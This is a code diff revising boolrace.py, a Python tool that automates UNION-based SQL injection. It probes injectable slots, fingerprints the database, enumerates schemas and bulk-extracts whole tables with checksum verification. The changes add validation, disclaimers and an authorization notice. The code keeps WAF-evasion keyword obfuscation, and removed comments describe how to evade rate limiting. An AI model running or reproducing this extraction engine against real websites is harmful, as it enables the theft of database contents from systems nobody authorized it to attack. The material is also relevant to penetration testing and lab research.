@@ -1,36 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-boolrace.py — 通用 UNION 注入通道引擎
-=====================================
+boolrace.py — v0.1.0 experimental UNION-channel research tool (Python 3.10+).
 
-不是「某站的腳本」。它把注入通道的所有「形狀」外置成設定，
-所以同一份程式可以對應 5 槽、1 槽、8 槽、有 WAF、無 WAF 等各種目標。
+Use only with explicit authorization. No completeness, snapshot consistency,
+performance, or lossless binary-conversion guarantee is made.
 
-設計原則
---------
-1. 每一層失敗都要能分辨「查詢錯」與「通道錯」。
-2. 所有「靜默失敗」都要主動偵測（見 SilentFailure）。
-3. 每個階段都有 --dry-run，先看要送什麼，再決定送不送。
+Stages: probe, fingerprint, enumerate, extract, verify, all.
+--dry-run reads configuration and prints stage/table intent only; it does not
+construct an engine, discover SQL, contact a target, or write output files.
+Column mode and generated Markdown/JSON reports are unsupported. Stage JSON
+artifacts remain available. CRC32 sums are non-cryptographic checks, not proof
+of integrity or row order. Use static fixtures for experimental evaluation.
 
-六個階段
---------
-  probe    找欄位數、找可見輸出槽
-  fingerprint  版本 / 函式可用性 / 環境常數
-  extract  逐表逐欄抽取（UNION / COMPRESS 兩種模式）
-  verify   伺服器端 CRC32 與本地比對
-  report   產出 markdown + json
-
-用法
-----
-  python3 boolrace.py probe      --config cfg.json
-  python3 boolrace.py fingerprint --config cfg.json
-  python3 boolrace.py extract    --config cfg.json --table orders
-  python3 boolrace.py verify     --config cfg.json
-  python3 boolrace.py report     --config cfg.json
-
-  # 對靶場一鍵全跑
-  python3 boolrace.py all --config cfg.lab.json
+Example: python boolrace.py all --config cfg.lab.json --dry-run
 """
 
 import argparse
@@ -57,11 +40,10 @@ DEFAULT_CONFIG = {
     "target": {
         "base_url": "http://127.0.0.1:8099/item.php?id=",
         "method": "GET",
-        "headers": {"User-Agent": "boolrace/1.0"},
+        "headers": {"User-Agent": "boolrace/0.1.0-experimental"},
         "timeout": 60,
-        "verify_tls": False,
-        # 重用 TCP 連線。實測每個請求有 25/34 的時間花在重新握手，
-        # 關掉這個等於自願慢一倍以上。
+        "verify_tls": True,
+        # Reuse TCP connections; performance depends on the target and workload.
         "keepalive": True,
     },
     "injection": {
@@ -92,14 +74,11 @@ DEFAULT_CONFIG = {
         "probe_order": ["title", "p1", "p2", "p3", "p4", "p5", "p6", "p7"],
     },
     "extraction": {
-        # union | compress | sliced | slices | column
-        # column（欄優先）在窄通道上快 5 倍以上，是回顯型注入的首選。
+        # union | compress | sliced | slices; column is disabled (row alignment).
         "mode": "union",
         "row_sep": "\x1f",         # 欄位分隔
         "chunk": 300000,           # compress 模式每槽每段字元
-        # 平行請求數。窄通道下這是最大的加速槓桿：實測 par=16 可到 2.8 倍。
-        # 別開太大 —— 很多 WAF / 限流會因為突發流量直接封鎖。
-        # 遇到 429 就往下調，遇到 406 就改用關鍵字混淆。
+        # Concurrent requests; keep load within the authorized test scope.
         "workers": 1,
         "throttle": 0.15,
         "null_marker": "\x00NULL\x00",
@@ -108,6 +87,14 @@ DEFAULT_CONFIG = {
     "tables": {},
     "output": {"dir": "./boolrace_out"},
 }
+
+
+def validate_mode(mode):
+    if mode == "column":
+        raise ValueError("unsupported experimental column mode: independent column "
+                         "queries cannot guarantee row alignment or a snapshot")
+    if mode not in ("union", "compress", "sliced", "slices"):
+        raise ValueError("unsupported extraction mode: %r" % mode)
 
 
 def deep_merge(base, over):
@@ -150,7 +137,7 @@ def _obfuscate(q, mode):
 def safe_decode(body, label="", on_binary="hex"):
     """把位元組解成文字；遇到無法解碼的二進位資料時，明確降級而不是崩潰。
 
-    真實資料庫一定有 BINARY/BLOB 欄位（雜湊、金鑰、圖片）。
+    資料庫可能包含 BINARY/BLOB；此文字降級表示不保證可逆。
     整批資料因為一個 0xFF 就丟掉，是最沒用的行為。
     寧可把那一欄轉成 hex，也要把其餘的資料帶回來。
     """
@@ -204,22 +191,14 @@ class SilentFailure(Exception):
 
 # ============================================================ HTTP
 class Transport:
-    """HTTP 通道。
-
-    這裡的效能決定一切：窄通道（單槽 80 字元）要幾千個請求才拉得完，
-    每個請求的固定成本會被放大幾千倍。實測發現每請求 34ms 裡有 25ms
-    是「重新建立連線」，真正的 SQL 只有 6ms。所以：
-
-      1. keep-alive：每條執行緒保留自己的連線，不重複握手。
-      2. 平行：伺服器端是 threaded 的，實測 par=16 可到 2.8 倍吞吐。
-    """
+    """HTTP transport with per-thread connection reuse; no throughput guarantee."""
 
     def __init__(self, cfg):
         t = cfg["target"]
         self.url = t["base_url"]
         self.headers = dict(t.get("headers") or {})
         self.timeout = t.get("timeout", 60)
-        self.verify = t.get("verify_tls", False)
+        self.verify = t.get("verify_tls", True)
         self.keepalive = t.get("keepalive", True)
         self.stats = {"req": 0, "bytes": 0, "406": 0, "429": 0, "err": 0}
         # 406 通常是 WAF 的「永久性」拒絕，不是暫時性錯誤。
@@ -229,6 +208,7 @@ class Transport:
         self.blocked_hint = None
         self._lock = threading.Lock()
         self._local = threading.local()
+        self._connections = set()
 
         self._tls = None
         if not self.verify:
@@ -256,6 +236,8 @@ class Transport:
                 c = http.client.HTTPConnection(
                     self._host, self._port, timeout=self.timeout)
             self._local.conn = c
+            with self._lock:
+                self._connections.add(c)
         return c
 
     def _drop_conn(self):
@@ -266,9 +248,17 @@ class Transport:
             except Exception:
                 pass
             self._local.conn = None
+            with self._lock:
+                self._connections.discard(c)
 
     def close(self):
+        self._close_pool()
         self._drop_conn()
+        with self._lock:
+            connections = list(self._connections)
+            self._connections.clear()
+        for connection in connections:
+            connection.close()
 
     def _raw_get(self, path):
         """單次 GET，回傳 (status, body, headers)。盡量重用連線。
@@ -395,7 +385,7 @@ class Transport:
         教訓：不要在池裡的任務中再開池。sliced 模式本來是「外層 32 個
         切片 + 每片內層 32 個分段」，兩層一乘就是 265 條執行緒，
         結果有請求被擠掉、資料短少，CRC 才發現。
-        現在所有平行都走這一個池，總併發永遠 = workers。
+        此池的 max_workers 限制池內併發數；不保證效能或資料一致性。
         """
         workers = max(1, int(workers or 1))
         if getattr(self, "_pool_obj", None) is None or \
@@ -518,10 +508,7 @@ class Engine:
 
     # ---------------------------------------------------------- SQL 組裝
     def close(self):
-        try:
-            self.tp._close_pool()
-        except Exception:
-            pass
+        self.tp.close()
 
     def _kw(self, sql):
         """關鍵字混淆：把 UNION SELECT 換成 /*!50000UNION*/ /*!50000SELECT*/"""
@@ -747,7 +734,7 @@ class Engine:
 
         兩個關鍵設計，都是被靶場打出來的：
 
-        1. 用 REPEAT() 讓「伺服器」生成資料，不要用 0x 字面量。
+        1. 用 REPEAT() 讓伺服器生成測試資料。
            字面量會讓 URL/payload 本身變長，撞到 request-line 上限，
            量到的是 URL 限制而不是回應截斷。
 
@@ -786,9 +773,7 @@ class Engine:
                 break
             caps[name] = best
 
-        # 同一頁面的槽容量應該相同；個別偏低的幾乎都是偶發錯誤。
-        # 取所有「成功測到」值的最大值作為共同容量，避免某個槽
-        # 因一次暫存表錯誤被永久低估，拖累整條通道。
+        # Recheck smaller measurements; capacities may differ across slots.
         vals = [v for v in caps.values() if v > 0]
         if len(vals) > 1:
             top = max(vals)
@@ -809,8 +794,7 @@ class Engine:
            for /tmp/#sql-temptable。這是伺服器端的暫存表問題，
            重試就好 —— 若當成「容量上限」，會把 4MB 誤判成 1KB。
 
-        2. 同一頁面的所有槽容量其實相同。個別槽測出偏低，
-           幾乎都是偶發錯誤，不是真的比較窄。
+        2. 槽位容量可能不同；測量結果不代表未來回應容量的保證。
         """
         ex = "REPEAT(0x51,%d)" % n        # 讓伺服器生成，payload 恆定很短
         for t in range(tries):
@@ -940,7 +924,7 @@ class Engine:
     def _binary_cols(self, table, cols):
         """問 information_schema 哪些欄位是二進位型別。
 
-        真實資料庫一定有 BINARY/VARBINARY/BLOB（雜湊、金鑰、序列化資料）。
+        資料庫可能包含 BINARY/VARBINARY/BLOB。
         這些欄位不能當文字傳：位元組 0xFF 在 UTF-8 裡沒有等價字元，
         一旦「字元化」就永久失真，CRC 也對不回去。
         正確做法是在伺服器端就 HEX()，全程只傳 ASCII，位元組不丟。
@@ -963,8 +947,8 @@ class Engine:
                 for c in v.split(","):
                     if c:
                         found.add(c.strip())
-        except Exception:
-            pass
+        except (QueryError, ChannelError, ValueError, TypeError) as e:
+            raise SilentFailure("binary column metadata unavailable: %s" % e) from e
         self._bin_cols_cache[key] = found
         return found
 
@@ -977,7 +961,7 @@ class Engine:
         return "IFNULL(%s,0x%s)" % (base, nullm_hex)
 
     def _agg_sql_framed(self, table, cols):
-        """長度前綴編碼：每欄變成 "N:內容"，徹底不受分隔符污染。
+        """長度前綴編碼：每欄變成 "N:內容"；邊界由宣告長度決定。
 
         CONCAT_WS + 分隔符在真實資料上必然踩雷 —— 只要某欄的值剛好
         含有分隔符，整列就會被劈開（實測 edge_cases.has_sep = a\x1fb）。
@@ -1005,17 +989,23 @@ class Engine:
             j = text.find(":", i)
             if j < 0:
                 return None
+            prefix = text[i:j]
+            if not re.fullmatch(r"[0-9]+", prefix):
+                return None
             try:
-                ln = int(text[i:j])
+                ln = int(prefix)
             except ValueError:
                 return None
-            out.append(text[j + 1:j + 1 + ln])
-            i = j + 1 + ln
+            end = j + 1 + ln
+            if end > n:
+                return None
+            out.append(text[j + 1:end])
+            i = end
             if _ < ncols - 1:
                 if text[i:i + len(sep)] != sep:
                     return None
                 i += len(sep)
-        return out
+        return out if i == n else None
 
     def _agg_sql(self, table, cols, null_bitmap=False):
         """組出「每列用 row_sep 串起來」的聚合表達式。
@@ -1044,8 +1034,7 @@ class Engine:
 
     def extract_table(self, table, cols):
         mode = self.cfg["extraction"]["mode"]
-        if mode == "column":
-            return self._extract_column(table, cols)
+        validate_mode(mode)
         if mode == "compress":
             return self._extract_compress(table, cols)
         if mode == "slices":
@@ -1056,7 +1045,7 @@ class Engine:
 
     def _extract_slices(self, table, cols):
         """逐列抓取：每次只取一列，用 LIMIT offset,1。
-        最慢，但對任何容量的槽位都能用 —— 窄通道的最後手段。
+        每列仍須能放進槽位；多次查詢沒有共同快照或穩定列順序。
         回傳與其他模式相同結構。"""
         sep = self.cfg["extraction"]["row_sep"]
         nullm = self.cfg["extraction"]["null_marker"]
@@ -1068,19 +1057,18 @@ class Engine:
         try:
             v, _, _ = self.query("(SELECT COUNT(*) FROM `%s`)" % table)
             total = int(v)
-        except Exception:
-            total = None
+        except (QueryError, ChannelError, ValueError, TypeError) as e:
+            raise SilentFailure("cannot count rows before extraction: %s" % e) from e
 
         rows, i, reqs = [], 0, 0
         while True:
             if total is not None and i >= total:
                 break
             ex = "(SELECT %s FROM `%s` LIMIT %d,1)" % (parts, table, i)
-            try:
-                v, _, _ = self.query(ex)
-            except QueryError:
-                break
+            v, _, _ = self.query(ex)
             if not v or v.upper() == "NULL":
+                if total is not None and len(rows) != total:
+                    raise SilentFailure("row stream ended before the reported row count")
                 break
             vals = v.split(sep)
             if len(vals) != len(cols):
@@ -1150,7 +1138,7 @@ class Engine:
         """把表切成若干段，每段聚合後都遠低於伺服器上限。
 
         回傳 [(offset, limit), ...]。空表回傳 []。
-        這是唯一能繞過 group_concat_max_len 的全量拉取方式。
+        切片仍受單列大小、聚合限制與跨查詢資料變動影響。
         """
         total = None
         try:
@@ -1184,7 +1172,7 @@ class Engine:
                     raise SilentFailure(
                         "a single row of %r aggregates to %d chars, which "
                         "exceeds the safe budget %d. One row cannot be carried "
-                        "in one response; extract this table column-by-column."
+                        "in one response; reduce the configured projection. Column mode is unsupported."
                         % (table, got, budget))
                 lim = max(1, lim // 2)
             plan.append((off, lim))
@@ -1192,27 +1180,10 @@ class Engine:
         return plan
 
     def _extract_column(self, table, cols):
-        """欄優先（column-major）抽取：每一欄各自聚合成一個 JSON 陣列。
+        """Legacy research implementation; disabled by extract_table.
 
-        為什麼快這麼多（本地實測 5.54x）：
-
-        列優先時，每一列是 18 個不同欄位的值串在一起，zlib 看到的是一串
-        互不相關的資料，壓不動。欄優先時同一欄的值連續排列，重複度極高，
-        zlib 可以大幅壓縮：
-
-            id       5000 個遞增整數
-            status   只有 4 種值
-            city     只有 10 種值
-
-        附帶好處：
-
-        - NULL 用 JSON 原生 null 表示，天生無歧義。不需要 null_marker，
-          也不需要 null/空字串的還原邏輯。
-        - 沒有欄位分隔符，所以不會有分隔符污染（a\\x1fb 這類值）。
-        - 每一欄都很小，永遠不會撞到 group_concat_max_len（1MB）。
-
-        代價：欄數 = 聚合查詢數。18 欄就是 18 次聚合，
-        但每次都很小，而且可以平行。
+        Independent column queries do not establish row identity or a shared
+        snapshot. Equal lengths cannot establish correct row pairing.
         """
         setc = self.cfg["extraction"]
         workers = max(1, int(setc.get("workers") or 1))
@@ -1291,8 +1262,7 @@ class Engine:
     def _extract_sliced(self, table, cols):
         """用 JSON_ARRAYAGG 分段全量拉取：每段壓縮後傳回。
 
-        比 slices 模式快得多（一段 = 一個請求，不是一列一個請求），
-        又能繞過 group_concat_max_len。
+        每段可能需要多個請求；跨查詢不提供快照一致性保證。
         """
         plan = self._plan_slices(table, cols)
         if plan is None:
@@ -1307,8 +1277,8 @@ class Engine:
         # 實際併發就只有 8。正確做法是把所有切片的請求攤平成一個批次，
         # 一次全部送出去，併發度 = workers。
         #
-        # 順序仍然安全：先記住每個切片在批次中的位置與長度，
-        # 收齊後按切片順序組回去，切片內再按分段順序拼 base64。
+        # Preserve request order locally; this does not establish SQL row order
+        # or a consistent database snapshot across slices.
         nslot = len(self.slots)
         workers = max(1, int(setc.get("workers") or 1))
         throttle = float(setc.get("throttle") or 0.0)
@@ -1451,9 +1421,7 @@ class Engine:
            又在另一套座標系算 SUBSTRING，兩者會錯開。
 
         3. 先問到 total，就能把所有分段一次算出來、平行送出。
-           窄通道下 total 是幾萬字元，等於幾千個請求；
-           序列送要幾分鐘，平行送能砍到幾分之一。
-           回傳順序由 executor.map 保證，拼接不會錯位。
+           請求順序由 executor.map 保留，但不同請求仍可能讀到不同資料狀態。
         """
         setc = self.cfg["extraction"]
         chunk = self._blob_chunk()
@@ -1493,7 +1461,7 @@ class Engine:
         return "".join(parts).replace("\n", "").replace("\r", "").strip(), None
 
     def _decode_blob(self, blob_str, total, table=""):
-        """base64 -> zlib -> bytes，每一步都驗證，絕不吞掉截斷。"""
+        """Decode base64/zlib and compare the advertised uncompressed length."""
         blob = blob_str.encode()
         blob += b"=" * (-len(blob) % 4)
         try:
@@ -1579,6 +1547,8 @@ class Engine:
                 "likely truncated by the page or by a response-size cap. "
                 "First 80 chars: %r. Reduce extraction.chunk, or the slot "
                 "cannot carry this table at all." % (e.msg, head))
+        if not isinstance(arr, list) or any(not isinstance(item, str) for item in arr):
+            raise SilentFailure("aggregated JSON must be an array of row strings")
         rows, bad = [], 0
         framed = self.cfg["extraction"].get("framing") == "length"
         for item in arr:
@@ -1613,10 +1583,15 @@ class Engine:
 
     # ---------------------------------------------------------- verify
     def verify_table(self, table, cols, rows):
-        """伺服器端逐列 CRC32 加總，與本地比對。繞過所有解析邏輯。"""
+        """比較 CRC32 加總；這是非密碼學檢查，不保證快照、列順序或無碰撞。"""
+        if not isinstance(rows, list) or any(not isinstance(r, list) or len(r) != len(cols) for r in rows):
+            return {"ok": None, "error": "invalid row shape or column count"}
         sep = self.cfg["extraction"]["row_sep"]
         nullm = self.cfg["extraction"]["null_marker"]
-        bin_cols = self._binary_cols(table, cols)
+        try:
+            bin_cols = self._binary_cols(table, cols)
+        except SilentFailure as e:
+            return {"ok": None, "error": str(e)}
         parts = [self._col_expr(c, nullm.encode().hex(), c in bin_cols) for c in cols]
         cw = "CONCAT_WS(0x%s,%s)" % (sep.encode().hex(), ",".join(parts))
         ex = "(SELECT SUM(CRC32(%s)) FROM `%s`)" % (cw, table)
@@ -1628,13 +1603,17 @@ class Engine:
         for r in rows:
             # NULL 必須還原成 null_marker 再算 CRC —— 伺服器端用的是
             # IFNULL(col, null_marker)，若這裡當成空字串，CRC 永遠對不上。
-            joined = sep.join(nullm if v is None else v for v in r)
+            if any(v is not None and type(v) not in (str, int) for v in r):
+                return {"ok": None, "error": "unsupported scalar type; SQL text representation unknown"}
+            joined = sep.join(nullm if v is None else str(v) for v in r)
             local = (local + (zlib.crc32(joined.encode()) & 0xFFFFFFFF)) & 0xFFFFFFFFFFFFFFFF
         # MySQL SUM 是 BIGINT，讓 python 整數直接比
         # 空表：SUM(CRC32(...)) 回 NULL，本地也是 0 —— 這算通過。
-        if sv in ("", None) and local == 0:
-            return {"ok": True, "server": "0 (empty table)", "local": 0,
-                    "rows": len(rows)}
+        if sv in ("", None):
+            return {"ok": None, "error": "missing server checksum"}
+        if sv == "NULL" and not rows:
+            return {"ok": True, "server": "NULL (empty aggregate)", "local": 0,
+                    "rows": 0}
         try:
             ok = (int(sv) == local)
         except Exception:
@@ -1643,11 +1622,37 @@ class Engine:
 
 
 # ============================================================ CLI
+def validate_table_name(name):
+    # Restrict portable filenames rather than normalizing identifiers silently.
+    reserved = {"CON", "PRN", "AUX", "NUL", "_PROBE", "_FINGERPRINT", "_SCHEMA", "_VERIFY"}
+    reserved.update("%s%d" % (prefix, i) for prefix in ("COM", "LPT") for i in range(1, 10))
+    if (not isinstance(name, str) or not re.fullmatch(r"[A-Za-z0-9_][A-Za-z0-9_-]*", name)
+            or name.upper() in reserved):
+        raise ValueError("unsafe or unsupported table filename: %r" % name)
+
+
+def validate_tables(tables):
+    if not isinstance(tables, dict):
+        raise ValueError("tables must map table names to column lists")
+    names = set()
+    for name, cols in tables.items():
+        validate_table_name(name)
+        if name.casefold() in names:
+            raise ValueError("duplicate/colliding table filenames: %r" % name)
+        names.add(name.casefold())
+        if (not isinstance(cols, list) or not cols
+                or any(not isinstance(c, str) or not re.fullmatch(r"[A-Za-z0-9_]+", c) for c in cols)
+                or len(set(c.casefold() for c in cols)) != len(cols)):
+            raise ValueError("unsupported or duplicate column projection for table %r" % name)
+
+
 def load_cfg(path):
     cfg = json.loads(json.dumps(DEFAULT_CONFIG))
-    if path and os.path.exists(path):
+    if path:
         with open(path, encoding="utf-8") as f:
             cfg = deep_merge(cfg, json.load(f))
+    validate_mode(cfg["extraction"]["mode"])
+    validate_tables(cfg.get("tables", {}))
     return cfg
 
 
@@ -1661,13 +1666,38 @@ def main():
     ap.add_argument("--dry-run", action="store_true")
     a = ap.parse_args()
 
-    cfg = load_cfg(a.config)
+    try:
+        cfg = load_cfg(a.config)
+        if a.table:
+            validate_table_name(a.table)
+    except (OSError, ValueError, TypeError, KeyError) as e:
+        ap.error("config: %s" % e)
     outdir = a.out or cfg["output"]["dir"]
+    if a.stage == "report":
+        ap.error("report is unsupported in v0.1.0 experimental; existing stage JSON "
+                 "files are not a generated Markdown/JSON report")
+    if a.dry_run:
+        print(json.dumps({"dry_run": True, "stage": a.stage,
+                          "config": a.config, "mode": cfg["extraction"]["mode"],
+                          "tables": [a.table] if a.table else list(cfg.get("tables") or {}),
+                          "output_dir": outdir,
+                          "intent": "configuration/stage intent only; no discovered SQL, "
+                                    "no engine, no requests, no output writes"},
+                         ensure_ascii=False, indent=2))
+        return 0
     os.makedirs(outdir, exist_ok=True)
     eng = Engine(cfg)
 
+    def output_path(name):
+        base = os.path.realpath(outdir)
+        path = os.path.join(base, name)
+        resolved = os.path.realpath(path)
+        if os.path.commonpath([base, resolved]) != base or os.path.islink(path):
+            raise ValueError("unsafe output path: %r" % name)
+        return path
+
     def save(name, obj):
-        with open(os.path.join(outdir, name), "w", encoding="utf-8") as f:
+        with open(output_path(name), "w", encoding="utf-8") as f:
             json.dump(obj, f, ensure_ascii=False, indent=1)
 
     def stage_probe():
@@ -1690,6 +1720,9 @@ def main():
         if not dbs:
             eng.fingerprint()
             dbs = eng.profile.get("databases") or []
+        configured_schema = cfg["target"].get("schema")
+        if configured_schema:
+            dbs = [configured_schema]
         result = {}
         for db in dbs:
             if db in ("information_schema", "performance_schema", "mysql", "sys"):
@@ -1697,69 +1730,109 @@ def main():
             tl = eng.list_tables(db)
             result[db] = {}
             for t in tl:
+                if t in result[db]:
+                    raise ValueError("duplicate table name discovered in schema %r: %r" % (db, t))
                 result[db][t] = eng.list_columns(db, t)
                 print("[enumerate] %s.%s (%d cols)" % (db, t, len(result[db][t])))
         save("_schema.json", result)
         return result
 
-    def stage_extract(schema=None):
+    def select_tables(schema=None):
+        tables = dict(cfg.get("tables") or {})
+        selected_schema = cfg["target"].get("schema")
+        if not tables:
+            if schema is None:
+                schema = stage_enum()
+            if len(schema) != 1:
+                raise ValueError("schema selection is ambiguous; configure target.schema "
+                                 "to a single current database")
+            selected_schema, discovered = next(iter(schema.items()))
+            tables = dict(discovered)
+        if selected_schema:
+            if not eng.slots:
+                stage_probe()
+            current, _, _ = eng.query("DATABASE()")
+            if current != selected_schema:
+                raise ValueError("schema %r is not current database %r; unqualified "
+                                 "extraction is unsupported" % (selected_schema, current))
+        selected = {t: cols for t, cols in tables.items() if not a.table or t == a.table}
+        if not selected:
+            raise ValueError("no tables selected; nothing can be extracted or verified")
+        validate_tables(selected)
+        return selected
+
+    def stage_extract(tables):
         if not eng.slots:
             stage_probe()
-        tables = cfg.get("tables") or {}
-        if not tables:
-            schema = schema or stage_enum()
-            for db, ts in schema.items():
-                for t, cols in ts.items():
-                    tables[t] = cols
+        succeeded = {}
+        failed = False
         for tname, cols in tables.items():
-            if a.table and tname != a.table:
-                continue
             print("[extract] %s (%d cols) ..." % (tname, len(cols)), end=" ", flush=True)
             try:
                 rows, meta = eng.extract_table(tname, cols)
             except (SilentFailure, QueryError, ChannelError) as e:
                 print("FAIL: %s: %s" % (type(e).__name__, e))
+                failed = True
                 continue
-            with open(os.path.join(outdir, tname + ".json"), "w",
+            with open(output_path(tname + ".json"), "w",
                       encoding="utf-8") as f:
                 json.dump({"table": tname, "cols": cols, "rows": rows,
                            "meta": meta}, f, ensure_ascii=False)
             print("%d rows %s" % (len(rows), meta))
+            succeeded[tname] = cols
+        return succeeded, failed
 
-    def stage_verify():
-        tables = cfg.get("tables") or {}
+    def stage_verify(tables):
         res = {}
         for tname in tables:
-            p = os.path.join(outdir, tname + ".json")
-            if not os.path.exists(p):
-                continue
-            d = json.load(open(p, encoding="utf-8"))
-            r = eng.verify_table(tname, d["cols"], d["rows"])
+            try:
+                p = output_path(tname + ".json")
+                with open(p, encoding="utf-8") as f:
+                    d = json.load(f)
+                if not isinstance(d, dict) or d.get("table") != tname or d.get("cols") != tables[tname]:
+                    raise ValueError("extraction file table/projection does not match selection")
+                r = eng.verify_table(tname, d["cols"], d["rows"])
+            except (OSError, ValueError, KeyError, TypeError, SilentFailure, QueryError, ChannelError) as e:
+                r = {"ok": None, "error": str(e)[:160]}
             res[tname] = r
             print("[verify] %-22s %s" % (tname, r))
         save("_verify.json", res)
+        return bool(res) and all(r.get("ok") is True for r in res.values())
 
-    if a.stage == "probe":
-        stage_probe()
-    elif a.stage == "fingerprint":
-        stage_fp()
-    elif a.stage == "enumerate":
-        stage_enum()
-    elif a.stage == "extract":
-        stage_extract()
-    elif a.stage == "verify":
-        if not eng.slots:
+    status = 0
+    try:
+        if a.stage == "probe":
             stage_probe()
-        stage_verify()
-    elif a.stage == "all":
-        stage_probe(); stage_fp(); stage_enum(); stage_extract(); stage_verify()
-    elif a.stage == "report":
-        print("see _verify.json / _fingerprint.json in", outdir)
+        elif a.stage == "fingerprint":
+            stage_fp()
+        elif a.stage == "enumerate":
+            stage_enum()
+        elif a.stage == "extract":
+            _, failed = stage_extract(select_tables())
+            status = int(failed)
+        elif a.stage == "verify":
+            if not eng.slots:
+                stage_probe()
+            status = int(not stage_verify(select_tables()))
+        elif a.stage == "all":
+            stage_probe()
+            stage_fp()
+            schema = stage_enum()
+            tables = select_tables(schema)
+            extracted, failed = stage_extract(tables)
+            verified = stage_verify(extracted)
+            status = int(failed or not verified)
+    except (SilentFailure, QueryError, ChannelError, OSError, ValueError, TypeError, KeyError) as e:
+        print("[error] %s: %s" % (type(e).__name__, e), file=sys.stderr)
+        return 1
+    finally:
+        eng.close()
 
     st = eng.tp.stats
     print("\n[stats] req=%d bytes=%d 406=%d err=%d"
           % (st["req"], st["bytes"], st["406"], st["err"]))
+    return status
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
